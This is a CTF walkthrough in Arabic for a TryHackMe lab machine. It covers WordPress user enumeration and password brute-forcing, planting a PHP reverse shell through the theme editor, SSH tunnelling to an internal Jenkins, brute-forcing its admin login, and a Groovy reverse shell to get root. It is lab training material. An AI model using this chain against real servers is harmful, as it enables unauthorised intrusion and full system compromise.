
---

### Internal ctf

![](https://cdn-images-1.medium.com/max/1680/1*oG_2PvyNNQHQ6ZBkF2osdQ.jpeg)

### 1. نجهز ال ip

```
sudo nano /etc/hosts
```

![](https://cdn-images-1.medium.com/max/1120/1*RBnHRAbipGYhQWLnd-fEZg.png)

2.scan
```
┌──(kali㉿kali)-[~/Downloads/THM]  
└─$ nmap -sC -sV 10.49.148.219   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-07 21:39 EET  
Nmap scan report for internal.thm (10.49.148.219)  
Host is up (0.26s latency).  
Not shown: 998 closed tcp ports (reset)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)  
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)  
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)  
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))  
|_http-title: Apache2 Ubuntu Default Page: It works  
|_http-server-header: Apache/2.4.29 (Ubuntu)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 21.57 seconds
```
لقد عرفت ان port 80 . 22 open
```

┌──(kali㉿kali)-[~/Downloads/THM]  
└─$ gobuster dir -u http://10.49.148.219 -w /usr/share/wordlists/dirb/common.txt  
===============================================================  
Gobuster v3.8  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://10.49.148.219  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.8  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
/.hta                 (Status: 403) [Size: 278]  
/.htaccess            (Status: 403) [Size: 278]  
/.htpasswd            (Status: 403) [Size: 278]  
/blog                 (Status: 301) [Size: 313] [--> http://10.49.148.219/blog/]  
/index.html           (Status: 200) [Size: 10918]  
/javascript           (Status: 301) [Size: 319] [--> http://10.49.148.219/javascript/]  
/phpmyadmin           (Status: 301) [Size: 319] [--> http://10.49.148.219/phpmyadmin/]  
/server-status        (Status: 403) [Size: 278]  
/wordpress            (Status: 301) [Size: 318] [--> http://10.49.148.219/wordpress/]  
Progress: 4613 / 4613 (100.00%)  
===============================================================  
Finished  
===============================================================
```

هندخل علي /blog

![](https://cdn-images-1.medium.com/max/1120/1*1VR8z_wfjNJaoenpF67fqQ.png)

log in اما ننزل نلاقي

![](https://cdn-images-1.medium.com/max/1120/1*LGUjhEvPmZhvbL39Rn0rTQ.png)

بعد اما ندخل عليه ونجرب ندخل الحساب نلاقي انه بيتأكد من Username الاول فبيظهر الخطأ ده

![](https://cdn-images-1.medium.com/max/1120/1*gzoxMhPRnanqDIDrbVTFyA.png)

فهنخمن Username بادوات زي hydra , wpscan , Burp Suite بس انا هستخدم الاسهل
```

┌──(kali㉿kali)-[~/Downloads/THM]  
└─$ wpscan --url http://internal.thm/blog/wp-login.php -e u 

```
![](https://cdn-images-1.medium.com/max/1120/1*6yGd7IGL7ryzEoeuUwRSEQ.png)

ولو مشتغلش او عملت كثير وما اشتغل اعمل — no-update

```
wpscan --url http://internal.thm/blog/wp-login.php -e u --no-update

```
ده بيجيب Username فهنخمن الباسورد

```
┌──(kali㉿kali)-[~/Downloads/THM]  
└─$ wpscan --url http://internal.thm/blog/wp-login.php --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

![](https://cdn-images-1.medium.com/max/1120/1*S7aJP5W1beh0xRoWUA5wdg.png)

واخيرا تم تسجيل الدخول

![](https://cdn-images-1.medium.com/max/1120/1*l-GlDWbhwfVFEOaJ5-bEmg.png)

نذهب الي The email is correct ثم الي Appearance

![](https://cdn-images-1.medium.com/max/1120/1*mH5EPUYJWYNxN-X8pg65yQ.png)

ثم نذهب الي Editor Theme

![](https://cdn-images-1.medium.com/max/1120/1*p2ktjNE-8XptV1kB_WKEWg.png)

ثم الي

![](https://cdn-images-1.medium.com/max/1120/1*tPHWD8UkSwjAoJgaBxMm-Q.png)

نضع reverse-shell.php في المكان كود php

![](https://cdn-images-1.medium.com/max/1120/1*YTkb6DLasJyQVoxiy6-bFA.png)

وبعد اما تحط كود php المتعدل نعمل

![](https://cdn-images-1.medium.com/max/1120/1*LjiUSHNTep_RtkbFmleHKA.png)

ونروح اي صفحة بيشتغل الكودعليها بعد تجهيز nc

```
┌──(kali㉿kali)-[~/Downloads/THM]
└─$ nc -lvnp 1234
```
ودي مثال علي الرابط [http://internal.thm/blog/index.php](http://internal.thm/blog/index.php) تقدر تدخل علي اي حاجه بيشتغل فيها [index.php](http://internal.thm/blog/index.php)

وبعد اما نوصل لل reverse-shell ندخل علي opt

![](https://cdn-images-1.medium.com/max/1120/1*A8QrgeeUeK8vwBGMekgSlA.png)

ودي الياسورد و اليوزر للssh فهنسجل دخول علي ssh
```
┌──(kali㉿kali)-[~/Downloads/THM]  
└─$ ssh aubreanna@10.49.182.209
```
وبعد الاتصال هنعمل

![](https://cdn-images-1.medium.com/max/1120/1*dvwZo0z8N-vKUwgm71YNfQ.png)
```
aubreanna@internal:~$ cat jenkins.txt                             
Internal Jenkins service is running on 172.17.0.2:8080    
aubreanna@internal:~$
```
ده معناه الي احني نقدر نشفل الInternal Jenkins service علي localhos port8080 ونقدر نعمل ده بssh

```
┌──(kali㉿kali)-[~/Downloads/THM]  
└─$ ssh -L 8080:localhost:8080 aubreanna@10.49.182.209

```
وبعد كده هنشغل localhost:8080 ولو مشتغلش ادخل علي localhost منغير port

![](https://cdn-images-1.medium.com/max/1120/1*Wr8pfm1DYnJrZhYs44cCUw.png)

وأول حاجه هتيجي في بلناه هي نبحث علي default user Jenkins وهنلاقيه `**admin**`

ونحاول نخمن الباسورد من الBurp Suite بعد تشغيل متصفح ال Burp Suite هنتيع الخطوات دي مع اكيد عمل الطلب بعد الخطوة 1

![](https://cdn-images-1.medium.com/max/1120/1*XqGM3bGLKsVIjJ3EAX6Wbg.png)

![](https://cdn-images-1.medium.com/max/1120/1*KopBXgpxkv-uKDujlgrYNA.png)

في الخطوه 2 هنحدد بعد password= لان الي بعده في الطلب ده password اصلا ونفذ الخطوه 3 ثم 4 وفي 4 هتختار الwordlists و الافضل تبقى rockyou.txt لانها كبييييييييرة وقويه و المسار بتعها هو /usr/share/wordlists/rockyou.txt

وتعمل

![](https://cdn-images-1.medium.com/max/1120/1*UWt557aLcQ6rFZ8dbiWSqw.png)

![](https://cdn-images-1.medium.com/max/1120/1*2vK-RrOGuWgGtEoCEIlLpg.png)

بعد اما تدوس علي length هتلاقي فرق كبير بين الباسورد الصح و الغلط وعمل iog in

![](https://cdn-images-1.medium.com/max/1120/1*smr7mJxonNIeid-UG64ltw.png)

هنروح هنا وبهدين هنا

![](https://cdn-images-1.medium.com/max/1120/1*lYi4vBewLGrLkM_xqZij3A.png)

![](https://cdn-images-1.medium.com/max/1120/1*kFjipdUtMBuqs-hp-WgpvA.png)

هتلاقي اسم لغة البرمجه [Groovy script](http://www.groovy-lang.org) ابحث علي كود لعمل reverse-shell Groovy وحطه هنه بعد التعديل

![](https://cdn-images-1.medium.com/max/1120/1*fdTWRLU5l_qmctB-4PzFpA.png)

وقبل عمل Run شغل nc

```
┌──(kali㉿kali)-[~/Downloads/THM]  
└─$ nc -lvnp 9001  
listening on [any] 9001 ...
```

وعمل Run

![](https://cdn-images-1.medium.com/max/1120/1*gqSrK7IxDZX9LSCjGNVVcQ.png)

وكده حصلت علي root

![](https://cdn-images-1.medium.com/max/1120/1*Bo2cbBgxeI0azl6rs_U8Rg.png)

ثم تهانينا علي الانتهاء
